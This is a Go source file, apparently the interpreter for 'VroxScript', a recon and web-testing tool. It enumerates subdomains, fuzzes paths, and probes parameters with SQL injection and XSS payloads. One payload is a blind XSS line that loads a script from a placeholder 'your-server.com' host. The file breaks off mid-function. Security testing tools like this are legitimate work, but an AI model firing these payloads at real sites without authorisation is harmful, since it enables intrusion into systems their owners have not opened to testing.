package main

import (
	"archive/zip"
	"bufio"
	"crypto/md5"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ============================================================
// COLORS — Extended palette
// ============================================================
var COLORS = map[string]string{
	"RED":       "\033[91m",
	"GREEN":     "\033[92m",
	"YELLOW":    "\033[93m",
	"BLUE":      "\033[94m",
	"CYAN":      "\033[96m",
	"PURPLE":    "\033[95m",
	"WHITE":     "\033[97m",
	"BOLD":      "\033[1m",
	"DIM":       "\033[2m",
	"BLINK":     "\033[5m",
	"UNDERLINE": "\033[4m",
	"ITALIC":    "\033[3m",
	"RESET":     "\033[0m",
	"BG_RED":    "\033[41m",
	"BG_GREEN":  "\033[42m",
	"BG_YELLOW": "\033[43m",
	"BG_BLUE":   "\033[44m",
	"BG_CYAN":   "\033[46m",
	"BG_PURPLE": "\033[45m",
	"BG_WHITE":  "\033[47m",
	"ORANGE":    "\033[38;5;208m",
	"PINK":      "\033[38;5;213m",
	"LIME":      "\033[38;5;154m",
	"TEAL":      "\033[38;5;51m",
	"GOLD":      "\033[38;5;220m",
	"SILVER":    "\033[38;5;247m",
	"MAROON":    "\033[38;5;124m",
	"NAVY":      "\033[38;5;17m",
	"CORAL":     "\033[38;5;203m",
	"VIOLET":    "\033[38;5;135m",
}

const VERSION = "2.3"

var tlsConfig = &tls.Config{InsecureSkipVerify: true}
var httpClient = &http.Client{
	Timeout: 8 * time.Second,
	Transport: &http.Transport{TLSClientConfig: tlsConfig},
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	},
}
var httpClientFollow = &http.Client{
	Timeout: 8 * time.Second,
	Transport: &http.Transport{TLSClientConfig: tlsConfig},
}

var globalCookies = map[string]string{}
var globalHeaders = map[string]string{}
var globalAPIKeys = map[string]string{}
var breakSignal = false
var continueSignal = false
var scriptStartTime = time.Now()

func vroxError(msg string, lineNum int) {
	fmt.Println(COLORS["RED"] + "\n[VroxScript Error] Line " + strconv.Itoa(lineNum) + ": " + msg + COLORS["RESET"])
	fmt.Println(COLORS["YELLOW"] + "-> Fix your .vs file and try again\n" + COLORS["RESET"])
	os.Exit(1)
}
func vroxSuccess(msg string) { fmt.Println(COLORS["GREEN"] + msg + COLORS["RESET"]) }
func vroxInfo(msg string)    { fmt.Println(COLORS["CYAN"] + msg + COLORS["RESET"]) }
func vroxWarn(msg string)    { fmt.Println(COLORS["YELLOW"] + msg + COLORS["RESET"]) }
func vroxPurple(msg string)  { fmt.Println(COLORS["PURPLE"] + msg + COLORS["RESET"]) }
func vroxOrange(msg string)  { fmt.Println(COLORS["ORANGE"] + msg + COLORS["RESET"]) }

// ============================================================
// STRING HELPERS
// ============================================================
func resolveColor(s string, variables map[string]interface{}) string {
	re := regexp.MustCompile(`\{([A-Z_0-9]+)\}`)
	return re.ReplaceAllStringFunc(s, func(match string) string {
		name := match[1 : len(match)-1]
		if v, ok := variables["__color_"+name]; ok { return fmt.Sprint(v) }
		if c, ok := COLORS[name]; ok { return c }
		return match
	})
}

func interpolateString(s string, variables map[string]interface{}) string {
	s = resolveColor(s, variables)
	re := regexp.MustCompile(`\{([^}]+)\}`)
	return re.ReplaceAllStringFunc(s, func(match string) string {
		varName := match[1 : len(match)-1]
		if v, ok := variables[varName]; ok { return fmt.Sprint(v) }
		return match
	})
}

func resolveValue(key string, variables map[string]interface{}) string {
	key = strings.TrimSpace(strings.Trim(key, "\""))
	if v, ok := variables[key]; ok { return fmt.Sprint(v) }
	return key
}

func resolveExpression(expr string, variables map[string]interface{}) string {
	expr = strings.TrimSpace(expr)
	if strings.HasPrefix(expr, "\"\"\"") && strings.HasSuffix(expr, "\"\"\"") {
		return interpolateString(expr[3:len(expr)-3], variables)
	}
	if strings.HasPrefix(expr, "\"") && strings.HasSuffix(expr, "\"") {
		return interpolateString(expr[1:len(expr)-1], variables)
	}
	if strings.Contains(expr, " + ") {
		parts := strings.SplitN(expr, " + ", 2)
		left := resolveExpression(strings.TrimSpace(parts[0]), variables)
		right := resolveExpression(strings.TrimSpace(parts[1]), variables)
		l, le := strconv.ParseFloat(left, 64)
		r, re2 := strconv.ParseFloat(right, 64)
		if le == nil && re2 == nil {
			res := l + r
			if res == float64(int(res)) { return strconv.Itoa(int(res)) }
			return strconv.FormatFloat(res, 'f', 2, 64)
		}
		return left + right
	}
	if v, ok := variables[expr]; ok { return fmt.Sprint(v) }
	if c, ok := COLORS[expr]; ok { return c }
	return strings.Trim(expr, "\"")
}

func evalCondition(condition string, variables map[string]interface{}) bool {
	condition = strings.TrimSpace(condition)
	if strings.Contains(condition, " and ") {
		parts := strings.SplitN(condition, " and ", 2)
		return evalCondition(parts[0], variables) && evalCondition(parts[1], variables)
	}
	if strings.Contains(condition, " or ") {
		parts := strings.SplitN(condition, " or ", 2)
		return evalCondition(parts[0], variables) || evalCondition(parts[1], variables)
	}
	if strings.HasPrefix(condition, "not ") { return !evalCondition(condition[4:], variables) }
	for _, op := range []string{"==", "!=", ">=", "<=", ">", "<"} {
		if strings.Contains(condition, op) {
			parts := strings.SplitN(condition, op, 2)
			left := resolveValue(strings.TrimSpace(parts[0]), variables)
			right := resolveValue(strings.TrimSpace(parts[1]), variables)
			switch op {
			case "==": return left == right
			case "!=": return left != right
			case ">": l, _ := strconv.ParseFloat(left, 64); r, _ := strconv.ParseFloat(right, 64); return l > r
			case "<": l, _ := strconv.ParseFloat(left, 64); r, _ := strconv.ParseFloat(right, 64); return l < r
			case ">=": l, _ := strconv.ParseFloat(left, 64); r, _ := strconv.ParseFloat(right, 64); return l >= r
			case "<=": l, _ := strconv.ParseFloat(left, 64); r, _ := strconv.ParseFloat(right, 64); return l <= r
			}
		}
	}
	if v, ok := variables[condition]; ok {
		s := fmt.Sprint(v)
		return s != "" && s != "false" && s != "0" && s != "null"
	}
	return condition == "true"
}

func evalMath(expr string, variables map[string]interface{}) float64 {
	expr = strings.TrimSpace(expr)
	for k, v := range variables { expr = strings.ReplaceAll(expr, k, fmt.Sprint(v)) }
	for _, op := range []string{"+", "-", "*", "/", "%"} {
		if strings.Contains(expr, op) {
			parts := strings.SplitN(expr, op, 2)
			l, _ := strconv.ParseFloat(strings.TrimSpace(parts[0]), 64)
			r, _ := strconv.ParseFloat(strings.TrimSpace(parts[1]), 64)
			switch op {
			case "+": return l + r
			case "-": return l - r
			case "*": return l * r
			case "/": if r != 0 { return l / r }
			case "%": return float64(int(l) % int(r))
			}
		}
	}
	res, _ := strconv.ParseFloat(expr, 64)
	return res
}

// ============================================================
// PASSIVE SUBDOMAIN SOURCES
// ============================================================
func queryCrtSh(domain string) []string {
	vroxInfo("[passive] Querying crt.sh...")
	resp, err := httpClientFollow.Get("https://crt.sh/?q=%25." + domain + "&output=json")
	if err != nil { return []string{} }
	defer resp.Body.Close()
	var data []map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&data)
	results := []string{}
	seen := map[string]bool{}
	for _, entry := range data {
		name := fmt.Sprint(entry["name_value"])
		for _, sub := range strings.Split(name, "\n") {
			sub = strings.TrimSpace(strings.ToLower(strings.TrimPrefix(sub, "*.")))
			if strings.HasSuffix(sub, "."+domain) && !seen[sub] {
				seen[sub] = true
				results = append(results, sub)
				fmt.Println(COLORS["TEAL"] + "[crt.sh] " + sub + COLORS["RESET"])
			}
		}
	}
	return results
}

func queryHackerTarget(domain string) []string {
	vroxInfo("[passive] Querying HackerTarget...")
	resp, err := httpClientFollow.Get("https://api.hackertarget.com/hostsearch/?q=" + domain)
	if err != nil { return []string{} }
	defer resp.Body.Close()
	buf := make([]byte, 100000)
	n, _ := resp.Body.Read(buf)
	results := []string{}
	seen := map[string]bool{}
	for _, line := range strings.Split(string(buf[:n]), "\n") {
		parts := strings.Split(line, ",")
		if len(parts) > 0 {
			sub := strings.TrimSpace(parts[0])
			if strings.HasSuffix(sub, "."+domain) && !seen[sub] {
				seen[sub] = true
				results = append(results, sub)
				fmt.Println(COLORS["TEAL"] + "[hackertarget] " + sub + COLORS["RESET"])
			}
		}
	}
	return results
}

func queryRapidDNS(domain string) []string {
	vroxInfo("[passive] Querying RapidDNS...")
	resp, err := httpClientFollow.Get("https://rapiddns.io/subdomain/" + domain + "?full=1&down=1")
	if err != nil { return []string{} }
	defer resp.Body.Close()
	buf := make([]byte, 500000)
	n, _ := resp.Body.Read(buf)
	re := regexp.MustCompile(`([a-zA-Z0-9._-]+\.` + regexp.QuoteMeta(domain) + `)`)
	matches := re.FindAllString(string(buf[:n]), -1)
	results := []string{}
	seen := map[string]bool{}
	for _, m := range matches {
		m = strings.ToLower(m)
		if !seen[m] { seen[m] = true; results = append(results, m); fmt.Println(COLORS["TEAL"] + "[rapiddns] " + m + COLORS["RESET"]) }
	}
	return results
}

func queryURLScan(domain string) []string {
	vroxInfo("[passive] Querying URLScan.io...")
	resp, err := httpClientFollow.Get("https://urlscan.io/api/v1/search/?q=domain:" + domain + "&size=100")
	if err != nil { return []string{} }
	defer resp.Body.Close()
	var data map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&data)
	results := []string{}
	seen := map[string]bool{}
	if rd, ok := data["results"].([]interface{}); ok {
		for _, r := range rd {
			if entry, ok := r.(map[string]interface{}); ok {
				if page, ok := entry["page"].(map[string]interface{}); ok {
					if d, ok := page["domain"].(string); ok {
						d = strings.ToLower(d)
						if strings.HasSuffix(d, "."+domain) && !seen[d] {
							seen[d] = true; results = append(results, d)
							fmt.Println(COLORS["TEAL"] + "[urlscan] " + d + COLORS["RESET"])
						}
					}
				}
			}
		}
	}
	return results
}

func queryAlienVault(domain string) []string {
	vroxInfo("[passive] Querying AlienVault OTX...")
	resp, err := httpClientFollow.Get("https://otx.alienvault.com/api/v1/indicators/domain/" + domain + "/passive_dns")
	if err != nil { return []string{} }
	defer resp.Body.Close()
	var data map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&data)
	results := []string{}
	seen := map[string]bool{}
	if passive, ok := data["passive_dns"].([]interface{}); ok {
		for _, r := range passive {
			if entry, ok := r.(map[string]interface{}); ok {
				if hostname, ok := entry["hostname"].(string); ok {
					hostname = strings.ToLower(hostname)
					if strings.HasSuffix(hostname, "."+domain) && !seen[hostname] {
						seen[hostname] = true; results = append(results, hostname)
						fmt.Println(COLORS["TEAL"] + "[alienvault] " + hostname + COLORS["RESET"])
					}
				}
			}
		}
	}
	return results
}

func queryVirusTotal(domain string) []string {
	apiKey := globalAPIKeys["VIRUSTOTAL"]
	if apiKey == "" { vroxWarn("[virustotal] No API key. Use: setkey VIRUSTOTAL your_key"); return []string{} }
	vroxInfo("[passive] Querying VirusTotal...")
	req, _ := http.NewRequest("GET", "https://www.virustotal.com/api/v3/domains/"+domain+"/subdomains?limit=40", nil)
	req.Header.Set("x-apikey", apiKey)
	resp, err := httpClientFollow.Do(req)
	if err != nil { return []string{} }
	defer resp.Body.Close()
	var data map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&data)
	results := []string{}
	seen := map[string]bool{}
	if d, ok := data["data"].([]interface{}); ok {
		for _, item := range d {
			if entry, ok := item.(map[string]interface{}); ok {
				if id, ok := entry["id"].(string); ok {
					id = strings.ToLower(id)
					if !seen[id] { seen[id] = true; results = append(results, id); fmt.Println(COLORS["TEAL"] + "[virustotal] " + id + COLORS["RESET"]) }
				}
			}
		}
	}
	return results
}

func queryCertSpotter(domain string) []string {
	vroxInfo("[passive] Querying CertSpotter...")
	resp, err := httpClientFollow.Get("https://api.certspotter.com/v1/issuances?domain=" + domain + "&include_subdomains=true&expand=dns_names")
	if err != nil { return []string{} }
	defer resp.Body.Close()
	var data []map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&data)
	results := []string{}
	seen := map[string]bool{}
	for _, entry := range data {
		if dnsNames, ok := entry["dns_names"].([]interface{}); ok {
			for _, name := range dnsNames {
				sub := strings.ToLower(strings.TrimPrefix(fmt.Sprint(name), "*."))
				if strings.HasSuffix(sub, "."+domain) && !seen[sub] {
					seen[sub] = true; results = append(results, sub)
					fmt.Println(COLORS["TEAL"] + "[certspotter] " + sub + COLORS["RESET"])
				}
			}
		}
	}
	return results
}

func queryThreatBook(domain string) []string {
	vroxInfo("[passive] Querying ThreatBook...")
	resp, err := httpClientFollow.Get("https://www.threatbook.io/api/v3/domain/sub_domains?apikey=&domain=" + domain)
	if err != nil { return []string{} }
	defer resp.Body.Close()
	var data map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&data)
	results := []string{}
	seen := map[string]bool{}
	if d, ok := data["data"].(map[string]interface{}); ok {
		if subs, ok := d["sub_domains"].([]interface{}); ok {
			for _, s := range subs {
				sub := strings.ToLower(fmt.Sprint(s))
				if !seen[sub] { seen[sub] = true; results = append(results, sub); fmt.Println(COLORS["TEAL"] + "[threatbook] " + sub + COLORS["RESET"]) }
			}
		}
	}
	return results
}

// DNS PERMUTATIONS (NEW 2.3)
func generatePermutations(domain string, wordlist []string) []string {
	parts := strings.SplitN(domain, ".", 2)
	if len(parts) < 2 { return []string{} }
	base := parts[0]
	tld := parts[1]
	perms := []string{}
	prefixes := []string{"dev","staging","test","prod","api","v1","v2","beta","old","new","internal","backup","admin","secure"}
	for _, w := range prefixes {
		perms = append(perms, w+"-"+base+"."+tld)
		perms = append(perms, base+"-"+w+"."+tld)
		perms = append(perms, w+base+"."+tld)
	}
	for _, w := range wordlist {
		w = strings.TrimSpace(w)
		if w != "" {
			perms = append(perms, w+"."+base+"."+tld)
			perms = append(perms, w+"-"+base+"."+tld)
		}
	}
	return perms
}

func scanSubdomains(domain string, wordlistFile string, passive bool) []string {
	allFound := []string{}
	seen := map[string]bool{}
	var mu sync.Mutex
	addResult := func(sub string) {
		sub = strings.ToLower(strings.TrimSpace(sub))
		mu.Lock()
		if !seen[sub] && strings.Contains(sub, domain) { seen[sub] = true; allFound = append(allFound, sub) }
		mu.Unlock()
	}
	if passive {
		vroxPurple("[scan] Starting passive reconnaissance...")
		var wg sync.WaitGroup
		sources := []func(string) []string{queryCrtSh, queryHackerTarget, queryRapidDNS, queryURLScan, queryAlienVault, queryVirusTotal, queryCertSpotter, queryThreatBook}
		for _, source := range sources {
			wg.Add(1)
			go func(fn func(string) []string) {
				defer wg.Done()
				for _, r := range fn(domain) { addResult(r) }
			}(source)
		}
		wg.Wait()
		vroxSuccess("[passive] Total from passive: " + strconv.Itoa(len(allFound)))
	}
	wordlist := []string{
		"www","mail","ftp","api","dev","test","staging","admin","blog","shop",
		"app","portal","dashboard","secure","cdn","static","media","images",
		"login","auth","support","docs","beta","old","new","v1","v2","api2",
		"mx","smtp","pop","imap","vpn","remote","cloud","s3","files","upload",
		"git","jenkins","jira","confluence","gitlab","prod","sandbox","qa",
		"internal","intranet","uat","mobile","m","api3","status","monitor",
		"metrics","grafana","kibana","elastic","redis","mysql","postgres",
		"mongo","backup","archive","pay","payment","checkout","store",
		"ns1","ns2","cpanel","webmail","autodiscover","wiki","forum","demo",
		"stage","preview","gateway","proxy","assets","img","video","stream",
	}
	if wordlistFile != "" {
		data, err := os.ReadFile(wordlistFile)
		if err == nil { wordlist = strings.Split(strings.TrimSpace(string(data)), "\n") }
	}
	// Add permutations
	perms := generatePermutations(domain, wordlist)
	wordlist = append(wordlist, perms...)
	vroxPurple("[scan] Active brute force with " + strconv.Itoa(len(wordlist)) + " words...")
	var wg sync.WaitGroup
	for _, sub := range wordlist {
		wg.Add(1)
		go func(s string) {
			defer wg.Done()
			var full string
			if strings.Contains(s, ".") { full = s } else { full = s + "." + domain }
			_, err := net.LookupHost(full)
			if err == nil { addResult(full); fmt.Println(COLORS["GREEN"] + "[bruteforce] " + full + COLORS["RESET"]) }
		}(sub)
	}
	wg.Wait()
	vroxSuccess("[scan] Total unique: " + strconv.Itoa(len(allFound)))
	return allFound
}

// ============================================================
// FAVICON HASH (NEW 2.3)
// ============================================================
func getFaviconHash(targetURL string) string {
	faviconURL := strings.TrimRight(targetURL, "/") + "/favicon.ico"
	resp, err := httpClientFollow.Get(faviconURL)
	if err != nil { fmt.Println(COLORS["RED"] + "[favicon] Failed: " + err.Error() + COLORS["RESET"]); return "" }
	defer resp.Body.Close()
	buf := make([]byte, 100000)
	n, _ := resp.Body.Read(buf)
	hash := md5.Sum(buf[:n])
	result := fmt.Sprintf("%x", hash)
	fmt.Println(COLORS["CYAN"] + "[favicon] Hash: " + result + " (use on Shodan: http.favicon.hash:" + result + ")" + COLORS["RESET"])
	return result
}

// ============================================================
// CDN DETECTION (NEW 2.3)
// ============================================================
func detectCDN(domain string) string {
	cdnPatterns := map[string][]string{
		"Cloudflare": {"cloudflare", "cf-ray"},
		"Akamai":     {"akamai", "akamaiedge"},
		"Fastly":     {"fastly"},
		"AWS CloudFront": {"cloudfront.net", "amazonaws.com"},
		"Azure CDN":  {"azureedge.net", "azure"},
		"Google CDN": {"googleusercontent", "googleplex"},
		"Incapsula":  {"incapsula", "imperva"},
		"Sucuri":     {"sucuri"},
		"MaxCDN":     {"maxcdn"},
	}
	vroxInfo("[cdn] Detecting CDN for " + domain + "...")
	cname, err := net.LookupCNAME(domain)
	if err == nil {
		for cdn, patterns := range cdnPatterns {
			for _, p := range patterns {
				if strings.Contains(strings.ToLower(cname), p) {
					fmt.Println(COLORS["CYAN"] + "[cdn] Detected: " + cdn + " (CNAME: " + cname + ")" + COLORS["RESET"])
					return cdn
				}
			}
		}
	}
	resp, err := httpClientFollow.Get("https://" + domain)
	if err == nil {
		defer resp.Body.Close()
		for cdn, patterns := range cdnPatterns {
			for _, p := range patterns {
				for k, v := range resp.Header {
					if strings.Contains(strings.ToLower(k+v[0]), p) {
						fmt.Println(COLORS["CYAN"] + "[cdn] Detected: " + cdn + COLORS["RESET"])
						return cdn
					}
				}
			}
		}
	}
	vroxWarn("[cdn] No CDN detected")
	return "none"
}

// ============================================================
// SERVICE BANNER (NEW 2.3)
// ============================================================
func grabBanner(host string, port int) string {
	conn, err := net.DialTimeout("tcp", host+":"+strconv.Itoa(port), 3*time.Second)
	if err != nil { return "" }
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(3 * time.Second))
	buf := make([]byte, 1024)
	n, _ := conn.Read(buf)
	banner := strings.TrimSpace(string(buf[:n]))
	if banner != "" { fmt.Println(COLORS["CYAN"] + "[banner] " + host + ":" + strconv.Itoa(port) + " -> " + banner + COLORS["RESET"]) }
	return banner
}

// ============================================================
// PING (NEW 2.3)
// ============================================================
func pingHost(host string) bool {
	out, err := exec.Command("ping", "-c", "1", "-W", "2", host).Output()
	if err != nil { fmt.Println(COLORS["RED"] + "[ping] " + host + " -> unreachable" + COLORS["RESET"]); return false }
	fmt.Println(COLORS["GREEN"] + "[ping] " + host + " -> alive" + COLORS["RESET"])
	_ = out
	return true
}

// ============================================================
// CIDR EXPANSION (NEW 2.3)
// ============================================================
func expandCIDR(cidr string) []string {
	ip, ipnet, err := net.ParseCIDR(cidr)
	if err != nil { fmt.Println(COLORS["RED"] + "[cidr] Invalid: " + err.Error() + COLORS["RESET"]); return []string{} }
	results := []string{}
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); incrementIP(ip) {
		results = append(results, ip.String())
	}
	fmt.Println(COLORS["CYAN"] + "[cidr] Expanded " + cidr + " -> " + strconv.Itoa(len(results)) + " IPs" + COLORS["RESET"])
	return results
}

func incrementIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 { break }
	}
}

// ============================================================
// ADVANCED FUZZER (ffuf-like)
// ============================================================
type FuzzResult struct {
	URL        string
	StatusCode int
	Size       int
	Words      int
	ResponseMs int64
}

func fuzzAdvanced(targetURL string, wordlistFile string, filterStatus []int, filterSize int, threads int, method string, postData string) []FuzzResult {
	wordlist := []string{
		"admin","login","dashboard","api","v1","v2","v3","config","backup",
		"test","dev","staging","upload","files","static","assets","images",
		"js","css","includes","wp-admin","administrator","manager","panel",
		"secret","private","internal","debug","console",".git",".env",
		"robots.txt","sitemap.xml","security.txt",".well-known","phpinfo.php",
		"server-status","api/v1","api/v2","api/v3","graphql","swagger",
		"swagger-ui","api-docs","actuator","metrics","health","status",
		"info","env","trace","dump","phpmyadmin","adminer","wp-login.php",
		"xmlrpc.php","wp-json","api/users","api/admin","api/config",
	}
	if wordlistFile != "" {
		data, err := os.ReadFile(wordlistFile)
		if err == nil { wordlist = strings.Split(strings.TrimSpace(string(data)), "\n") }
	}
	if threads <= 0 { threads = 50 }
	if method == "" { method = "GET" }
	found := []FuzzResult{}
	var mu sync.Mutex
	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup
	vroxInfo("[fuzz] Fuzzing " + targetURL + " [" + method + "] " + strconv.Itoa(len(wordlist)) + " words...")
	for _, path := range wordlist {
		wg.Add(1)
		sem <- struct{}{}
		go func(p string) {
			defer wg.Done()
			defer func() { <-sem }()
			fullURL := strings.TrimRight(targetURL, "/") + "/" + strings.TrimLeft(p, "/")
			start := time.Now()
			var resp *http.Response
			var err error
			if method == "POST" {
				resp, err = httpClient.Post(fullURL, "application/x-www-form-urlencoded", strings.NewReader(postData))
			} else {
				resp, err = httpClient.Get(fullURL)
			}
			elapsed := time.Since(start).Milliseconds()
			if err != nil { return }
			defer resp.Body.Close()
			buf := make([]byte, 10000)
			n, _ := resp.Body.Read(buf)
			wordCount := len(strings.Fields(string(buf[:n])))
			if len(filterStatus) > 0 {
				found_status := false
				for _, s := range filterStatus { if resp.StatusCode == s { found_status = true; break } }
				if !found_status { return }
			} else if resp.StatusCode == 404 { return }
			if filterSize > 0 && n == filterSize { return }
			result := FuzzResult{URL: fullURL, StatusCode: resp.StatusCode, Size: n, Words: wordCount, ResponseMs: elapsed}
			mu.Lock()
			found = append(found, result)
			color := COLORS["GREEN"]
			if resp.StatusCode == 403 { color = COLORS["YELLOW"] }
			if resp.StatusCode >= 500 { color = COLORS["RED"] }
			fmt.Println(color + "[fuzz] " + fullURL + " [" + strconv.Itoa(resp.StatusCode) + "] [size:" + strconv.Itoa(n) + "] [words:" + strconv.Itoa(wordCount) + "] [" + strconv.FormatInt(elapsed, 10) + "ms]" + COLORS["RESET"])
			mu.Unlock()
		}(path)
	}
	wg.Wait()
	vroxSuccess("[fuzz] Found " + strconv.Itoa(len(found)) + " results")
	return found
}

// ============================================================
// ADVANCED SQL INJECTION (NEW 2.3)
// ============================================================
func checkSQLiAdvanced(targetURL string, param string) []string {
	results := []string{}
	vroxInfo("[sqli] Running advanced SQL injection tests...")

	// Error based
	errorPayloads := []string{"'","''","' OR '1'='1","' OR 1=1--","\" OR 1=1--"}
	sqlErrors := []string{"sql syntax","mysql_fetch","ora-","sqlite_","warning: mysql","you have an error in your sql"}
	parsed, err := url.Parse(targetURL)
	if err != nil { return results }

	for _, payload := range errorPayloads {
		testURL := parsed.Scheme + "://" + parsed.Host + parsed.Path + "?" + param + "=" + url.QueryEscape(payload)
		resp, err := httpClientFollow.Get(testURL)
		if err == nil {
			defer resp.Body.Close()
			buf := make([]byte, 5000); n, _ := resp.Body.Read(buf)
			body := strings.ToLower(string(buf[:n]))
			for _, e := range sqlErrors {
				if strings.Contains(body, e) {
					result := "[ERROR-BASED] " + param + "=" + payload
					results = append(results, result)
					fmt.Println(COLORS["RED"] + "[sqli] ERROR-BASED: " + result + COLORS["RESET"])
					break
				}
			}
		}
	}

	// Time based blind
	vroxInfo("[sqli] Testing time-based blind...")
	normalStart := time.Now()
	httpClientFollow.Get(parsed.Scheme + "://" + parsed.Host + parsed.Path + "?" + param + "=1")
	normalTime := time.Since(normalStart).Milliseconds()

	timePayloads := []string{
		"1' AND SLEEP(5)--",
		"1' AND pg_sleep(5)--",
		"1'; WAITFOR DELAY '0:0:5'--",
		"1' AND BENCHMARK(5000000,MD5(1))--",
	}
	for _, payload := range timePayloads {
		testURL := parsed.Scheme + "://" + parsed.Host + parsed.Path + "?" + param + "=" + url.QueryEscape(payload)
		start := time.Now()
		resp, err := httpClientFollow.Get(testURL)
		elapsed := time.Since(start).Milliseconds()
		if err == nil {
			resp.Body.Close()
			if elapsed > normalTime+3000 {
				result := "[TIME-BASED] " + param + "=" + payload + " (delay: " + strconv.FormatInt(elapsed, 10) + "ms)"
				results = append(results, result)
				fmt.Println(COLORS["RED"] + "[sqli] TIME-BASED: " + result + COLORS["RESET"])
			}
		}
	}

	// Union based
	vroxInfo("[sqli] Testing union-based...")
	for i := 1; i <= 5; i++ {
		nulls := strings.Repeat(",NULL", i-1)
		payload := "' UNION SELECT NULL" + nulls + "--"
		testURL := parsed.Scheme + "://" + parsed.Host + parsed.Path + "?" + param + "=" + url.QueryEscape(payload)
		resp, err := httpClientFollow.Get(testURL)
		if err == nil {
			defer resp.Body.Close()
			buf := make([]byte, 5000); n, _ := resp.Body.Read(buf)
			body := strings.ToLower(string(buf[:n]))
			if !strings.Contains(body, "error") && resp.StatusCode == 200 {
				result := "[UNION-BASED] " + param + "=" + payload + " (columns: " + strconv.Itoa(i) + ")"
				results = append(results, result)
				fmt.Println(COLORS["RED"] + "[sqli] UNION-BASED: " + result + COLORS["RESET"])
				break
			}
		}
	}

	if len(results) == 0 { vroxSuccess("[sqli] No SQL injection found") }
	return results
}

// ============================================================
// ADVANCED XSS (NEW 2.3)
// ============================================================
func checkXSSAdvanced(targetURL string, param string) []string {
	results := []string{}
	vroxInfo("[xss] Running advanced XSS tests...")

	// Reflected XSS
	reflectedPayloads := []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"'><script>alert(1)</script>",
		"\"><script>alert(1)</script>",
		"javascript:alert(1)",
		"<details open ontoggle=alert(1)>",
		"<body onload=alert(1)>",
	}
	parsed, err := url.Parse(targetURL)
	if err != nil { return results }

	for _, payload := range reflectedPayloads {
		testURL := parsed.Scheme + "://" + parsed.Host + parsed.Path + "?" + param + "=" + url.QueryEscape(payload)
		resp, err := httpClientFollow.Get(testURL)
		if err == nil {
			defer resp.Body.Close()
			buf := make([]byte, 5000); n, _ := resp.Body.Read(buf)
			if strings.Contains(string(buf[:n]), payload) {
				result := "[REFLECTED] " + param + "=" + payload
				results = append(results, result)
				fmt.Println(COLORS["RED"] + "[xss] REFLECTED: " + result + COLORS["RESET"])
			}
		}
	}

	// Parameter mining
	vroxInfo("[xss] Mining parameters...")
	_, body, _ := fetchPage(targetURL)
	paramRe := regexp.MustCompile(`name=["']([^"']+)["']|id=["']([^"']+)["']|\?([a-zA-Z_]+)=`)
	matches := paramRe.FindAllStringSubmatch(body, -1)
	foundParams := []string{}
	seen := map[string]bool{}
	for _, m := range matches {
		for _, g := range m[1:] {
			if g != "" && !seen[g] {
				seen[g] = true
				foundParams = append(foundParams, g)
				fmt.Println(COLORS["CYAN"] + "[xss] Found param: " + g + COLORS["RESET"])
			}
		}
	}
	if len(foundParams) > 0 { results = append(results, "[PARAMS] "+strings.Join(foundParams, ", ")) }

	// Blind XSS payload generator
	blindPayload := "<script src='https://your-server.com/b.js'></script>"
	fmt.Println(COLORS["YELLOW"] + "[xss] Blind XSS payload (set your server): " + blindPayload + COLORS["RESET"])
	results = append(results, "[BLIND-XSS-PAYLOAD] "+blindPayload)

	if len(results) == 0 { vroxSuccess("[xss] No XSS found") }
	return results
}

// ============================================================
// PARAMETER MINING (NEW 2.3)
// ============================================================
func mineParams(targetURL string) []string {
	vroxInfo("[params] Mining parameters from " + targetURL + "...")
	_, body, _ := fetchPage(targetURL)
	results := []string{}
	seen := map[string]bool{}

	patterns := []*regexp.Regexp{
		regexp.MustCompile(`name=["']([^"']+)["']`),
		regexp.MustCompile(`id=["']([^"']+)["']`),
		regexp.MustCompile(`\?([a-zA-Z_][a-zA-Z0-9_]*)=`),
		regexp.MustCompile(`&([a-zA-Z_][a-zA-Z0-9_]*)=`),
		regexp.MustCompile(`"([a-zA-Z_][a-zA-Z0-9_]*)"\s*:`),
	}

	for _, re := range patterns {
		for _, m := range re.FindAllStringSubmatch(body, -1) {
			if len(m) > 1 && m[1] != "" && !seen[m[1]] {
				seen[m[1]] = true
				results = append(results, m[1])
				fmt.Println(COLORS["CYAN"] + "[params] Found: " + m[1] + COLORS["RESET"])
			}
		}
	}
	vroxSuccess("[params] Found " + strconv.Itoa(len(results)) + " parameters")
	return results
}

// ============================================================
// PROBE / HTTPX-LIKE
// ============================================================
type HostInfo struct {
	Host       string
	StatusCode int
	Title      string
	Tech       []string
	Server     string
	ContentLen int
	ResponseMs int64
}

func probeHost(host string) HostInfo {
	info := HostInfo{Host: host}
	start := time.Now()
	req, err := http.NewRequest("GET", "https://"+host, nil)
	if err != nil { return info }
	req.Header.Set("User-Agent", "VroxScript/"+VERSION)
	resp, err := httpClientFollow.Do(req)
	if err != nil {
		req2, _ := http.NewRequest("GET", "http://"+host, nil)
		resp2, err2 := httpClientFollow.Do(req2)
		if err2 != nil { return info }
		resp = resp2
	}
	defer resp.Body.Close()
	info.ResponseMs = time.Since(start).Milliseconds()
	info.StatusCode = resp.StatusCode
	info.Server = resp.Header.Get("Server")
	buf := make([]byte, 50000); n, _ := resp.Body.Read(buf)
	body := string(buf[:n])
	info.ContentLen = n
	if m := regexp.MustCompile(`(?i)<title>([^<]+)</title>`).FindStringSubmatch(body); len(m) > 1 { info.Title = strings.TrimSpace(m[1]) }
	for tech, pattern := range map[string]string{"WordPress":"wp-content","React":"react","Angular":"angular","Vue":"vue","jQuery":"jquery","Nginx":"nginx","Apache":"apache","PHP":"php","Cloudflare":"cloudflare"} {
		if strings.Contains(strings.ToLower(body), strings.ToLower(pattern)) { info.Tech = append(info.Tech, tech) }
